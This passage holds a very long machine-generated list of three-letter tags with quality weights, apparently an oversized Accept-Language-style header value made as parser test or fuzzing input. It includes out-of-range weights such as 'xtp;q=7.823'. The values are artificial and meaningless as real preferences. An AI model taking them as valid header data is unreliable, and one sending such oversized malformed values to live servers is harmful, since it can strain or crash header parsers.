wku;q=0.826, wkv;q=0.230, wkw;q=0.705, wkx;q=0.438, wky;q=0.861, wkz;q=0.713, wla;q=0.462, wlb;q=0.677, wlc;q=0.112, wld;q=0.219, wle;q=0.064, wlf;q=0.865, wlg;q=0.539, wlh;q=0.352, wli;q=0.817, wlj;q=0.202, wlk;q=0.399, wll;q=0.065, wlm;q=0.374, wln;q=0.762, wlo;q=0.306, wlp;q=0.513, wlq;q=0.407, wlr;q=0.544, wls;q=0.953, wlt;q=0.509, wlu;q=0.143, wlv;q=0.476, wlw;q=0.191, wlx;q=0.219, wly;q=0.770, wlz;q=0.763, wma;q=0.821, wmb;q=0.632, wmc;q=0.577, wmd;q=0.247, wme;q=0.956, wmf;q=0.565, wmg;q=0.773, wmh;q=0.215, wmi;q=0.985, wmj;q=0.299, wmk;q=0.825, wml;q=0.724, wmm;q=0.582, wmn;q=0.726, wmo;q=0.273, wmp;q=0.066, wmq;q=0.680, wmr;q=0.991, wms;q=0.177, wmt;q=0.543, wmu;q=0.241, wmv;q=0.986, wmw;q=0.304, wmx;q=0.255, wmy;q=0.776, wmz;q=0.232, wna;q=0.311, wnb;q=0.051, wnc;q=0.067, wnd;q=0.078, wne;q=0.462, wnf;q=0.876, wng;q=0.558, wnh;q=0.528, wni;q=0.019, wnj;q=0.894, wnk;q=0.708, wnl;q=0.276, wnm;q=0.054, wnn;q=0.843, wno;q=0.660, wnp;q=0.323, wnq;q=0.584, wnr;q=0.167, wns;q=0.333, wnt;q=0.145, wnu;q=0.166, wnv;q=0.409, wnw;q=0.629, wnx;q=0.290, wny;q=0.038, wnz;q=0.717, woa;q=0.657, wob;q=0.084, woc;q=0.995, wod;q=0.135, woe;q=0.187, wof;q=0.827, wog;q=0.320, woh;q=0.216, woi;q=0.730, woj;q=0.383, wok;q=0.223, wol;q=0.015, wom;q=0.837, won;q=0.288, woo;q=0.393, wop;q=0.714, woq;q=0.121, wor;q=0.104, wos;q=0.152, wot;q=0.765, wou;q=0.024, wov;q=0.071, wow;q=0.752, wox;q=0.381, woy;q=0.547, woz;q=0.636, wpa;q=0.384, wpb;q=0.096, wpc;q=0.355, wpd;q=0.313, wpe;q=0.458, wpf;q=0.731, wpg;q=0.624, wph;q=0.162, wpi;q=0.225, wpj;q=0.011, wpk;q=0.461, wpl;q=0.225, wpm;q=0.003, wpn;q=0.814, wpo;q=0.677, wpp;q=0.200, wpq;q=0.291, wpr;q=0.438, wps;q=0.328, wpt;q=0.975, wpu;q=0.209, wpv;q=0.346, wpw;q=0.122, wpx;q=0.002, wpy;q=0.522, wpz;q=0.212, wqa;q=0.102, wqb;q=0.673, wqc;q=0.355, wqd;q=0.850, wqe;q=0.179, wqf;q=0.255, wqg;q=0.305, wqh;q=0.559, wqi;q=0.478, wqj;q=0.480, wqk;q=0.301, wql;q=0.621, wqm;q=0.562, wqn;q=0.728, wqo;q=0.631, wqp;q=0.372, wqq;q=0.822, wqr;q=0.773, wqs;q=0.492, wqt;q=0.152, wqu;q=0.434, wqv;q=0.632, wqw;q=0.596, wqx;q=0.689, wqy;q=0.000, wqz;q=0.593, wra;q=0.785, wrb;q=0.514, wrc;q=0.054, wrd;q=0.629, wre;q=0.812, wrf;q=0.403, wrg;q=0.487, wrh;q=0.124, wri;q=0.370, wrj;q=0.647, wrk;q=0.107, wrl;q=0.369, wrm;q=0.248, wrn;q=0.075, wro;q=0.494, wrp;q=0.009, wrq;q=0.065, wrr;q=0.010, wrs;q=0.107, wrt;q=0.785, wru;q=0.495, wrv;q=0.374, wrw;q=0.460, wrx;q=0.250, wry;q=0.790, wrz;q=0.388, wsa;q=0.774, wsb;q=0.767, wsc;q=0.196, wsd;q=0.927, wse;q=0.141, wsf;q=0.040, wsg;q=0.244, wsh;q=0.780, wsi;q=0.705, wsj;q=0.545, wsk;q=0.102, wsl;q=0.968, wsm;q=0.458, wsn;q=0.703, wso;q=0.610, wsp;q=0.473, wsq;q=0.661, wsr;q=0.065, wss;q=0.815, wst;q=0.392, wsu;q=0.536, wsv;q=0.870, wsw;q=0.250, wsx;q=0.072, wsy;q=0.853, wsz;q=0.334, wta;q=0.324, wtb;q=0.171, wtc;q=0.971, wtd;q=0.507, wte;q=0.669, wtf;q=0.597, wtg;q=0.849, wth;q=0.693, wti;q=0.209, wtj;q=0.331, wtk;q=0.386, wtl;q=0.114, wtm;q=0.062, wtn;q=0.912, wto;q=0.024, wtp;q=0.330, wtq;q=0.862, wtr;q=0.396, wts;q=0.215, wtt;q=0.506, wtu;q=0.434, wtv;q=0.029, wtw;q=0.529, wtx;q=0.789, wty;q=0.325, wtz;q=0.420, wua;q=0.182, wub;q=0.919, wuc;q=0.807, wud;q=0.548, wue;q=0.379, wuf;q=0.913, wug;q=0.730, wuh;q=0.090, wui;q=0.733, wuj;q=0.426, wuk;q=0.159, wul;q=0.866, wum;q=0.332, wun;q=0.105, wuo;q=0.998, wup;q=0.517, wuq;q=0.021, wur;q=0.189, wus;q=0.027, wut;q=0.245, wuu;q=0.043, wuv;q=0.759, wuw;q=0.278, wux;q=0.280, wuy;q=0.351, wuz;q=0.013, wva;q=0.395, wvb;q=0.914, wvc;q=0.812, wvd;q=0.886, wve;q=0.591, wvf;q=0.082, wvg;q=0.355, wvh;q=0.231, wvi;q=0.806, wvj;q=0.356, wvk;q=0.307, wvl;q=0.481, wvm;q=0.022, wvn;q=0.565, wvo;q=0.497, wvp;q=0.925, wvq;q=0.641, wvr;q=0.352, wvs;q=0.892, wvt;q=0.953, wvu;q=0.084, wvv;q=0.424, wvw;q=0.429, wvx;q=0.729, wvy;q=0.528, wvz;q=0.640, wwa;q=0.161, wwb;q=0.729, wwc;q=0.624, wwd;q=0.622, wwe;q=0.604, wwf;q=0.531, wwg;q=0.953, wwh;q=0.122, wwi;q=0.309, wwj;q=0.959, wwk;q=0.931, wwl;q=0.474, wwm;q=0.685, wwn;q=0.453, wwo;q=0.716, wwp;q=0.964, wwq;q=0.325, wwr;q=0.676, wws;q=0.007, wwt;q=0.911, wwu;q=0.823, wwv;q=0.667, www;q=0.768, wwx;q=0.773, wwy;q=0.181, wwz;q=0.541, wxa;q=0.480, wxb;q=0.373, wxc;q=0.206, wxd;q=0.109, wxe;q=0.557, wxf;q=0.112, wxg;q=0.093, wxh;q=0.297, wxi;q=0.108, wxj;q=0.836, wxk;q=0.180, wxl;q=0.365, wxm;q=0.294, wxn;q=0.715, wxo;q=0.381, wxp;q=0.270, wxq;q=0.663, wxr;q=0.040, wxs;q=0.026, wxt;q=0.285, wxu;q=0.777, wxv;q=0.731, wxw;q=0.674, wxx;q=0.844, wxy;q=0.540, wxz;q=0.751, wya;q=0.434, wyb;q=0.542, wyc;q=0.866, wyd;q=0.092, wye;q=0.038, wyf;q=0.831, wyg;q=0.303, wyh;q=0.626, wyi;q=0.856, wyj;q=0.430, wyk;q=0.499, wyl;q=0.656, wym;q=0.065, wyn;q=0.890, wyo;q=0.916, wyp;q=0.130, wyq;q=0.984, wyr;q=0.681, wys;q=0.062, wyt;q=0.596, wyu;q=0.992, wyv;q=0.624, wyw;q=0.462, wyx;q=0.342, wyy;q=0.363, wyz;q=0.850, wza;q=0.386, wzb;q=0.828, wzc;q=0.728, wzd;q=0.186, wze;q=0.848, wzf;q=0.713, wzg;q=0.350, wzh;q=0.178, wzi;q=0.334, wzj;q=0.553, wzk;q=0.186, wzl;q=0.903, wzm;q=0.208, wzn;q=0.079, wzo;q=0.101, wzp;q=0.651, wzq;q=0.895, wzr;q=0.031, wzs;q=0.773, wzt;q=0.266, wzu;q=0.624, wzv;q=0.371, wzw;q=0.121, wzx;q=0.714, wzy;q=0.474, wzz;q=0.983, xaa;q=0.475, xab;q=0.561, xac;q=0.210, xad;q=0.937, xae;q=0.023, xaf;q=0.222, xag;q=0.260, xah;q=0.882, xai;q=0.004, xaj;q=0.660, xak;q=0.194, xal;q=0.242, xam;q=0.042, xan;q=0.369, xao;q=0.113, xap;q=0.134, xaq;q=0.112, xar;q=0.453, xas;q=0.335, xat;q=0.900, xau;q=0.234, xav;q=0.793, xaw;q=0.487, xax;q=0.385, xay;q=0.356, xaz;q=0.679, xba;q=0.748, xbb;q=0.299, xbc;q=0.239, xbd;q=0.631, xbe;q=0.147, xbf;q=0.278, xbg;q=0.120, xbh;q=0.853, xbi;q=0.727, xbj;q=0.598, xbk;q=0.153, xbl;q=0.281, xbm;q=0.136, xbn;q=0.686, xbo;q=0.475, xbp;q=0.415, xbq;q=0.497, xbr;q=0.693, xbs;q=0.239, xbt;q=0.528, xbu;q=0.786, xbv;q=0.187, xbw;q=0.262, xbx;q=0.518, xby;q=0.153, xbz;q=0.205, xca;q=0.200, xcb;q=0.849, xcc;q=0.747, xcd;q=0.200, xce;q=0.302, xcf;q=0.763, xcg;q=0.343, xch;q=0.864, xci;q=0.062, xcj;q=0.253, xck;q=0.650, xcl;q=0.129, xcm;q=0.288, xcn;q=0.591, xco;q=0.285, xcp;q=0.721, xcq;q=0.452, xcr;q=0.559, xcs;q=0.494, xct;q=0.424, xcu;q=0.512, xcv;q=0.759, xcw;q=0.936, xcx;q=0.229, xcy;q=0.856, xcz;q=0.351, xda;q=0.984, xdb;q=0.182, xdc;q=0.028, xdd;q=0.885, xde;q=0.930, xdf;q=0.794, xdg;q=0.416, xdh;q=0.869, xdi;q=0.369, xdj;q=0.323, xdk;q=0.275, xdl;q=0.780, xdm;q=0.490, xdn;q=0.761, xdo;q=0.720, xdp;q=0.067, xdq;q=0.692, xdr;q=0.143, xds;q=0.491, xdt;q=0.761, xdu;q=0.737, xdv;q=0.858, xdw;q=0.632, xdx;q=0.873, xdy;q=0.089, xdz;q=0.456, xea;q=0.678, xeb;q=0.102, xec;q=0.742, xed;q=0.228, xee;q=0.784, xef;q=0.192, xeg;q=0.734, xeh;q=0.079, xei;q=0.712, xej;q=0.160, xek;q=0.881, xel;q=0.396, xem;q=0.023, xen;q=0.158, xeo;q=0.146, xep;q=0.135, xeq;q=0.942, xer;q=0.235, xes;q=0.540, xet;q=0.088, xeu;q=0.720, xev;q=0.619, xew;q=0.470, xex;q=0.755, xey;q=0.522, xez;q=0.054, xfa;q=0.866, xfb;q=0.685, xfc;q=0.279, xfd;q=0.011, xfe;q=0.211, xff;q=0.602, xfg;q=0.248, xfh;q=0.250, xfi;q=0.236, xfj;q=0.562, xfk;q=0.790, xfl;q=0.191, xfm;q=0.492, xfn;q=0.670, xfo;q=0.801, xfp;q=0.127, xfq;q=0.630, xfr;q=0.519, xfs;q=0.593, xft;q=0.771, xfu;q=0.393, xfv;q=0.333, xfw;q=0.559, xfx;q=0.970, xfy;q=0.449, xfz;q=0.338, xga;q=0.683, xgb;q=0.849, xgc;q=0.603, xgd;q=0.089, xge;q=0.673, xgf;q=0.806, xgg;q=0.693, xgh;q=0.106, xgi;q=0.950, xgj;q=0.445, xgk;q=0.599, xgl;q=0.019, xgm;q=0.150, xgn;q=0.142, xgo;q=0.447, xgp;q=0.715, xgq;q=0.227, xgr;q=0.200, xgs;q=0.712, xgt;q=0.410, xgu;q=0.257, xgv;q=0.684, xgw;q=0.687, xgx;q=0.405, xgy;q=0.471, xgz;q=0.201, xha;q=0.865, xhb;q=0.836, xhc;q=0.184, xhd;q=0.904, xhe;q=0.055, xhf;q=0.600, xhg;q=0.155, xhh;q=0.410, xhi;q=0.119, xhj;q=0.909, xhk;q=0.737, xhl;q=0.757, xhm;q=0.461, xhn;q=0.620, xho;q=0.363, xhp;q=0.409, xhq;q=0.651, xhr;q=0.196, xhs;q=0.390, xht;q=0.907, xhu;q=0.712, xhv;q=0.043, xhw;q=0.307, xhx;q=0.016, xhy;q=0.871, xhz;q=0.375, xia;q=0.265, xib;q=0.906, xic;q=0.296, xid;q=0.535, xie;q=0.833, xif;q=0.625, xig;q=0.368, xih;q=0.416, xii;q=0.045, xij;q=0.983, xik;q=0.313, xil;q=0.432, xim;q=0.841, xin;q=0.138, xio;q=0.027, xip;q=0.238, xiq;q=0.360, xir;q=0.962, xis;q=0.853, xit;q=0.126, xiu;q=0.978, xiv;q=0.877, xiw;q=0.464, xix;q=0.670, xiy;q=0.464, xiz;q=0.915, xja;q=0.297, xjb;q=0.157, xjc;q=0.217, xjd;q=0.679, xje;q=0.131, xjf;q=0.718, xjg;q=0.887, xjh;q=0.889, xji;q=0.005, xjj;q=0.421, xjk;q=0.999, xjl;q=0.606, xjm;q=0.300, xjn;q=0.320, xjo;q=0.546, xjp;q=0.859, xjq;q=0.707, xjr;q=0.986, xjs;q=0.413, xjt;q=0.636, xju;q=0.999, xjv;q=0.939, xjw;q=0.541, xjx;q=0.621, xjy;q=0.792, xjz;q=0.017, xka;q=0.534, xkb;q=0.071, xkc;q=0.082, xkd;q=0.176, xke;q=0.266, xkf;q=0.399, xkg;q=0.216, xkh;q=0.978, xki;q=0.087, xkj;q=0.821, xkk;q=0.323, xkl;q=0.812, xkm;q=0.846, xkn;q=0.343, xko;q=0.498, xkp;q=0.601, xkq;q=0.575, xkr;q=0.211, xks;q=0.180, xkt;q=0.343, xku;q=0.498, xkv;q=0.585, xkw;q=0.483, xkx;q=0.728, xky;q=0.271, xkz;q=0.526, xla;q=0.769, xlb;q=0.777, xlc;q=0.840, xld;q=0.694, xle;q=0.106, xlf;q=0.228, xlg;q=0.530, xlh;q=0.952, xli;q=0.843, xlj;q=0.383, xlk;q=0.492, xll;q=0.624, xlm;q=0.708, xln;q=0.733, xlo;q=0.788, xlp;q=0.187, xlq;q=0.133, xlr;q=0.902, xls;q=0.676, xlt;q=0.796, xlu;q=0.268, xlv;q=0.763, xlw;q=0.838, xlx;q=0.216, xly;q=0.958, xlz;q=0.673, xma;q=0.971, xmb;q=0.552, xmc;q=0.213, xmd;q=0.312, xme;q=0.060, xmf;q=0.708, xmg;q=0.193, xmh;q=0.165, xmi;q=0.499, xmj;q=0.297, xmk;q=0.360, xml;q=0.025, xmm;q=0.655, xmn;q=0.566, xmo;q=0.187, xmp;q=0.154, xmq;q=0.101, xmr;q=0.247, xms;q=0.991, xmt;q=0.814, xmu;q=0.910, xmv;q=0.558, xmw;q=0.801, xmx;q=0.988, xmy;q=0.888, xmz;q=0.980, xna;q=0.729, xnb;q=0.388, xnc;q=0.923, xnd;q=0.169, xne;q=0.142, xnf;q=0.827, xng;q=0.254, xnh;q=0.094, xni;q=0.079, xnj;q=0.475, xnk;q=0.965, xnl;q=0.343, xnm;q=0.707, xnn;q=0.339, xno;q=0.963, xnp;q=0.817, xnq;q=0.236, xnr;q=0.526, xns;q=0.413, xnt;q=0.834, xnu;q=0.510, xnv;q=0.819, xnw;q=0.630, xnx;q=0.567, xny;q=0.943, xnz;q=0.077, xoa;q=0.498, xob;q=0.621, xoc;q=0.168, xod;q=0.550, xoe;q=0.532, xof;q=0.949, xog;q=0.393, xoh;q=0.504, xoi;q=0.809, xoj;q=0.763, xok;q=0.271, xol;q=0.922, xom;q=0.905, xon;q=0.978, xoo;q=0.973, xop;q=0.271, xoq;q=0.707, xor;q=0.900, xos;q=0.482, xot;q=0.647, xou;q=0.564, xov;q=0.952, xow;q=0.144, xox;q=0.028, xoy;q=0.664, xoz;q=0.131, xpa;q=0.862, xpb;q=0.903, xpc;q=0.828, xpd;q=0.661, xpe;q=0.216, xpf;q=0.490, xpg;q=0.370, xph;q=0.594, xpi;q=0.664, xpj;q=0.774, xpk;q=0.253, xpl;q=0.594, xpm;q=0.664, xpn;q=0.338, xpo;q=0.945, xpp;q=0.857, xpq;q=0.819, xpr;q=0.413, xps;q=0.755, xpt;q=0.389, xpu;q=0.079, xpv;q=0.033, xpw;q=0.906, xpx;q=0.930, xpy;q=0.198, xpz;q=0.003, xqa;q=0.441, xqb;q=0.335, xqc;q=0.943, xqd;q=0.290, xqe;q=0.397, xqf;q=0.404, xqg;q=0.564, xqh;q=0.741, xqi;q=0.203, xqj;q=0.070, xqk;q=0.426, xql;q=0.793, xqm;q=0.103, xqn;q=0.146, xqo;q=0.351, xqp;q=0.953, xqq;q=0.114, xqr;q=0.611, xqs;q=0.148, xqt;q=0.657, xqu;q=0.196, xqv;q=0.807, xqw;q=0.589, xqx;q=0.571, xqy;q=0.688, xqz;q=0.243, xra;q=0.155, xrb;q=0.428, xrc;q=0.823, xrd;q=0.699, xre;q=0.143, xrf;q=0.633, xrg;q=0.622, xrh;q=0.585, xri;q=0.432, xrj;q=0.005, xrk;q=0.059, xrl;q=0.362, xrm;q=0.781, xrn;q=0.095, xro;q=0.892, xrp;q=0.419, xrq;q=0.004, xrr;q=0.153, xrs;q=0.537, xrt;q=0.825, xru;q=0.396, xrv;q=0.954, xrw;q=0.998, xrx;q=0.886, xry;q=0.716, xrz;q=0.596, xsa;q=0.652, xsb;q=0.601, xsc;q=0.328, xsd;q=0.075, xse;q=0.116, xsf;q=0.374, xsg;q=0.817, xsh;q=0.963, xsi;q=0.476, xsj;q=0.517, xsk;q=0.433, xsl;q=0.212, xsm;q=0.111, xsn;q=0.551, xso;q=0.927, xsp;q=0.893, xsq;q=0.039, xsr;q=0.359, xss;q=0.227, xst;q=0.471, xsu;q=0.833, xsv;q=0.048, xsw;q=0.815, xsx;q=0.404, xsy;q=0.699, xsz;q=0.873, xta;q=0.096, xtb;q=0.276, xtc;q=0.395, xtd;q=0.773, xte;q=0.123, xtf;q=0.731, xtg;q=0.571, xth;q=0.072, xti;q=0.138, xtj;q=0.566, xtk;q=0.940, xtl;q=0.229, xtm;q=0.949, xtn;q=0.069, xto;q=0.179, xtp;q=7.823, xtq;q=0.645, xtr;q=0.687, xts;q=0.053, xtt;q=0.695, xtu;q=0.388, xtv;q=0.775, xtw;q=0.424, xtx;q=0.634, xty;q=0.678, xtz;q=0.593, xua;q=0.866, xub;q=0.452, xuc;q=0.534, xud;q=0.558, xue;q=0.631, xuf;q=0.121, xug;q=0.047, xuh;q=0.410, xui;q=0.812, xuj;q=0.568, xuk;q=0.290, xul;q=0.610, xum;q=0.057, xun;q=0.534, xuo;q=0.295, xup;q=0.454, xuq;q=0.522, xur;q=0.674, xus;q=0.602, xut;q=0.126, xuu;q=0.004, xuv;q=0.014, xuw;q=0.876, xux;q=0.945, xuy;q=0.825, xuz;q=0.664, xva;q=0.000, xvb;q=0.301, xvc;q=0.862, xvd;q=0.919, xve;q=0.031, xvf;q=0.156, xvg;q=0.075, xvh;q=0.458, xvi;q=0.251, xvj;q=0.270, xvk;q=0.067, xvl;q=0.462, xvm;q=0.752, xvn;q=0.456, xvo;q=0.588, xvp;q=0.020, xvq;q=0.373, xvr;q=0.818, xvs;q=0.094, xvt;q=0.187, xvu;q=0.728, xvv;q=0.395, xvw;q=0.246, xvx;q=0.699, xvy;q=0.207, xvz;q=0.515, xwa;q=0.124, xwb;q=0.549, xwc;q=0.033, xwd;q=0.925, xwe;q=0.492, xwf;q=0.447, xwg;q=0.201, xwh;q=0.468, xwi;q=0.672, xwj;q=0.965, xwk;q=0.587, xwl;q=0.980, xwm;q=0.794, xwn;q=0.008, xwo;q=0.005, xwp;q=0.584, xwq;q=0.703, xwr;q=0.942, xws;q=0.576, xwt;q=0.708, xwu;q=0.468, xwv;q=0.448, xww;q=0.551, xwx;q=0.744, xwy;q=0.764, xwz;q=0.584, xxa;q=0.229, xxb;q=0.951, xxc;q=0.603, xxd;q=0.249, xxe;q=0.185, xxf;q=0.684, xxg;q=0.803, xxh;q=0.129, xxi;q=0.772, xxj;q=0.781, xxk;q=0.527, xxl;q=0.161, xxm;q=0.852, xxn;q=0.079, xxo;q=0.377, xxp;q=0.908, xxq;q=0.209, xxr;q=0.547, xxs;q=0.960, xxt;q=0.089, xxu;q=0.773, xxv;q=0.218, xxw;q=0.111, xxx;q=0.323, xxy;q=0.808, xxz;q=0.524, xya;q=0.007, xyb;q=0.394, xyc;q=0.976, xyd;q=0.403, xye;q=0.054, xyf;q=0.226, xyg;q=0.900, xyh;q=0.032, xyi;q=0.228, xyj;q=0.204, xyk;q=0.442, xyl;q=0.495, xym;q=0.821, xyn;q=0.372, xyo;q=0.918, xyp;q=0.561, xyq;q=0.791, xyr;q=0.967, xys;q=0.869, xyt;q=0.608, xyu;q=0.841, xyv;q=0.337, xyw;q=0.755, xyx;q=0.515, xyy;q=0.998, xyz;q=0.818, xza;q=0.855, xzb;q=0.354, xzc;q=0.125, xzd;q=0.588, xze;q=0.866, xzf;q=0.358, xzg;q=0.862, xzh;q=0.186, xzi;q=0.975, xzj;q=0.210, xzk;q=0.511, xzl;q=0.435, xzm;q=0.264, xzn;q=0.393, xzo;q=0.083, xzp;q=0.752, xzq;q=0.169, xzr;q=0.781, xzs;q=0.677, xzt;q=0.031, xzu;q=0.245, xzv;q=0.136, xzw;q=0.000, xzx;q=0.000, xzy;q=0.177, xzz;q=0.333, yaa;q=0.732, yab;q=0.815, yac;q=0.950, yad;q=0.024, yae;q=0.709, yaf;q=0.636, yag;q=0.607, yah;q=0.584, yai;q=0.608, yaj;q=0.736, yak;q=0.296, yal;q=0.733, yam;q=0.889, yan;q=0.125, yao;q=0.382, yap;q=0.092, yaq;q=0.557, yar;q=0.337, yas;q=0.712, yat;q=0.505, yau;q=0.895, yav;q=0.140, yaw;q=0.580, yax;q=0.788, yay;q=0.477, yaz;q=0.836, yba;q=0.192, ybb;q=0.858, ybc;q=0.558, ybd;q=0.227, ybe;q=0.170, ybf;q=0.146, ybg;q=0.956, ybh;q=0.334, ybi;q=0.394, ybj;q=0.236, ybk;q=0.264, ybl;q=0.922, ybm;q=0.329, ybn;q=0.386, ybo;q=0.670, ybp;q=0.568, ybq;q=0.947, ybr;q=0.334, ybs;q=0.634, ybt;q=0.177, ybu;q=0.615, ybv;q=0.448, ybw;q=0.354, ybx;q=0.230, yby;q=0.077, ybz;q=0.155, yca;q=0.009, ycb;q=0.732, ycc;q=0.844, ycd;q=0.518, yce;q=0.934, ycf;q=0.079, ycg;q=0.076, ych;q=0.281, yci;q=0.772, ycj;q=0.062, yck;q=0.078, ycl;q=0.979, ycm;q=0.074, ycn;q=0.117, yco;q=0.721, ycp;q=0.851, ycq;q=0.894, ycr;q=0.491, ycs;q=0.281, yct;q=0.023, ycu;q=0.443, ycv;q=0.246, ycw;q=0.756, ycx;q=0.549, ycy;q=0.427, ycz;q=0.596, yda;q=0.601, ydb;q=0.724, ydc;q=0.338, ydd;q=0.609, yde;q=0.119, ydf;q=0.205, ydg;q=0.686, ydh;q=0.648, ydi;q=0.417, ydj;q=0.721, ydk;q=0.137, ydl;q=0.427, ydm;q=0.788, ydn;q=0.939, ydo;q=0.968, ydp;q=0.187, ydq;q=0.544, ydr;q=0.082, yds;q=0.509, ydt;q=0.752, ydu;q=0.324, ydv;q=0.580, ydw;q=0.582, ydx;q=0.750, ydy;q=0.693, ydz;q=0.829, yea;q=0.790, yeb;q=0.132, yec;q=0.381, yed;q=0.158, yee;q=0.627, yef;q=0.652, yeg;q=0.706, yeh;q=0.069, yei;q=0.810, yej;q=0.323, yek;q=0.872, yel;q=0.914, yem;q=0.435, yen;q=0.980, yeo;q=0.860, yep;q=0.416, yeq;q=0.293, yer;q=0.785, yes;q=0.975, yet;q=0.089, yeu;q=0.966, yev;q=0.614, yew;q=0.472, yex;q=0.563, yey;q=0.582, yez;q=0.312, yfa;q=0.024, yfb;q=0.104, yfc;q=0.338, yfd;q=0.886, yfe;q=0.273, yff;q=0.331, yfg;q=0.513, yfh;q=0.452, yfi;q=0.430, yfj;q=0.855, yfk;q=0.288, yfl;q=0.694, yfm;q=0.763, yfn;q=0.368, yfo;q=0.755, yfp;q=0.289, yfq;q=0.128, yfr;q=0.278, yfs;q=0.096, yft;q=0.227, yfu;q=0.872, yfv;q=0.682, yfw;q=0.601, yfx;q=0.932, yfy;q=0.679, yfz;q=0.430, yga;q=0.086, ygb;q=0.478, ygc;q=0.077, ygd;q=0.378, yge;q=0.266, ygf;q=0.055, ygg;q=0.110, ygh;q=0.361, ygi;q=0.881, ygj;q=0.025, ygk;q=0.431, ygl;q=0.327, ygm;q=0.925, ygn;q=0.800, ygo;q=0.435, ygp;q=0.939, ygq;q=0.031, ygr;q=0.194, ygs;q=0.915, ygt;q=0.195, ygu;q=0.995, ygv;q=0.054, ygw;q=0.669, ygx;q=0.736, ygy;q=0.115, ygz;q=0.516, yha;q=0.562, yhb;q=0.462, yhc;q=0.868, yhd;q=0.980, yhe;q=0.493, yhf;q=0.978, yhg;q=0.649, yhh;q=0.826, yhi;q=0.557, yhj;q=0.764, yhk;q=0.010, yhl;q=0.844, yhm;q=0.674, yhn;q=0.509, yho;q=0.206, yhp;q=0.520, yhq;q=0.294, yhr;q=5.894, yhs;q=0.201, yht;q=0.027, yhu;q=0.569, yhv;q=0.695, yhw;q=0.822, yhx;q=0.795, yhy;q=0.319, yhz;q=0.521, yia;q=0.468, yib;q=0.475, yic;q=0.807, yid;q=0.654, yie;q=0.461, yif;q=0.141, yig;q=0.937, yih;q=0.295, yii;q=0.979, yij;q=0.639, yik;q=0.579, yil;q=0.061, yim;q=0.165, yin;q=0.241, yio;q=0.969, yip;q=0.624, yiq;q=0.605, yir;q=0.248, yis;q=0.286, yit;q=0.754, yiu;q=0.800, yiv;q=0.828, yiw;q=0.529, yix;q=0.717, yiy;q=0.827, yiz;q=0.195, yja;q=0.371, yjb;q=0.361, yjc;q=0.814, yjd;q=0.284, yje;q=0.218, yjf;q=0.989, yjg;q=0.789, yjh;q=0.707, yji;q=0.582, yjj;q=0.239, yjk;q=0.810, yjl;q=0.164, yjm;q=0.601, yjn;q=0.212, yjo;q=0.202, yjp;q=0.897, yjq;q=0.567, yjr;q=0.594, yjs;q=0.181, yjt;q=0.008, yju;q=0.803, yjv;q=0.309, yjw;q=0.215, yjx;q=0.018, yjy;q=0.669, yjz;q=0.709, yka;q=0.628, ykb;q=0.781, ykc;q=0.160, ykd;q=0.487, yke;q=0.410, ykf;q=0.305, ykg;q=0.069, ykh;q=0.124, yki;q=0.963, ykj;q=0.593, ykk;q=0.837, ykl;q=0.032, ykm;q=0.212, ykn;q=0.173, yko;q=0.395, ykp;q=0.369, ykq;q=0.413, ykr;q=0.579, yks;q=0.109, ykt;q=0.880, yku;q=0.866, ykv;q=0.892, ykw;q=0.402, ykx;q=0.957, yky;q=0.398, ykz;q=0.159, yla;q=0.893, ylb;q=0.698, ylc;q=0.470, yld;q=0.663, yle;q=0.055, ylf;q=0.494, ylg;q=0.824, ylh;q=0.872, yli;q=0.975, ylj;q=0.672, ylk;q=0.621, yll;q=0.286, ylm;q=0.103, yln;q=0.008, ylo;q=0.388, ylp;q=0.597, ylq;q=0.243, ylr;q=0.099, yls;q=0.118, ylt;q=0.658, ylu;q=0.639, ylv;q=0.080, ylw;q=0.383, ylx;q=0.618, yly;q=0.085, ylz;q=0.327, yma;q=0.444, ymb;q=0.592, ymc;q=0.246, ymd;q=0.854, yme;q=0.251, ymf;q=0.271, ymg;q=0.611, ymh;q=0.437, ymi;q=0.713, ymj;q=0.375, ymk;q=0.418, yml;q=0.951, ymm;q=0.450, ymn;q=0.443, ymo;q=0.487, ymp;q=0.454, ymq;q=0.088, ymr;q=0.428, yms;q=0.519, ymt;q=0.955, ymu;q=0.025, ymv;q=0.004, ymw;q=0.370, ymx;q=0.451, ymy;q=0.791, ymz;q=0.991, yna;q=0.569, ynb;q=0.008, ync;q=0.254, ynd;q=0.041, yne;q=0.064, ynf;q=0.824, yng;q=0.454, ynh;q=0.424, yni;q=0.166, ynj;q=0.110, ynk;q=0.352, ynl;q=0.150, ynm;q=0.096, ynn;q=0.514, yno;q=0.138, ynp;q=0.858, ynq;q=0.845, ynr;q=0.286, yns;q=0.256, ynt;q=0.733, ynu;q=0.910, ynv;q=0.139, ynw;q=0.955, ynx;q=0.787, yny;q=0.913, ynz;q=0.984, yoa;q=0.629, yob;q=0.907, yoc;q=0.920, yod;q=0.395, yoe;q=0.269, yof;q=0.444, yog;q=0.275, yoh;q=0.476, yoi;q=0.091, yoj;q=0.894, yok;q=0.099, yol;q=0.857, yom;q=0.611, yon;q=0.089, yoo;q=0.862, yop;q=0.752, yoq;q=0.358, yor;q=0.722, yos;q=0.380, yot;q=0.099, you;q=0.151, yov;q=0.581, yow;q=0.272, yox;q=0.569, yoy;q=0.518, yoz;q=0.351, ypa;q=0.114, ypb;q=0.412, ypc;q=0.961, ypd;q=0.767, ype;q=0.196, ypf;q=0.960, ypg;q=0.607, yph;q=0.383, ypi;q=0.426, ypj;q=0.090, ypk;q=0.888, ypl;q=0.604, ypm;q=0.298, ypn;q=0.814, ypo;q=0.923, ypp;q=0.646, ypq;q=0.820, ypr;q=0.234, yps;q=0.450, ypt;q=0.702, ypu;q=0.866, ypv;q=0.932, ypw;q=0.236, ypx;q=0.188, ypy;q=0.358, ypz;q=0.200, yqa;q=0.676, yqb;q=0.362, yqc;q=0.864, yqd;q=0.688, yqe;q=0.865, yqf;q=0.061, yqg;q=0.796, yqh;q=0.020, yqi;q=0.713, yqj;q=0.691, yqk;q=0.924, yql;q=0.899, yqm;q=0.996, yqn;q=0.018, yqo;q=0.389, yqp;q=0.854, yqq;q=0.206, yqr;q=0.126, yqs;q=0.378, yqt;q=0.931, yqu;q=0.406, yqv;q=0.415, yqw;q=0.127, yqx;q=0.750, yqy;q=0.748, yqz;q=0.873, yra;q=0.707, yrb;q=0.425, yrc;q=0.759, yrd;q=0.068, yre;q=0.016, yrf;q=0.604, yrg;q=0.912, yrh;q=0.485, yri;q=0.422, yrj;q=0.863, yrk;q=0.610, yrl;q=0.870, yrm;q=0.541, yrn;q=0.318, yro;q=0.846, yrp;q=0.427, yrq;q=0.413, yrr;q=0.215, yrs;q=0.702, yrt;q=0.371, yru;q=0.262, yrv;q=0.530, yrw;q=0.575, yrx;q=0.851, yry;q=0.757, 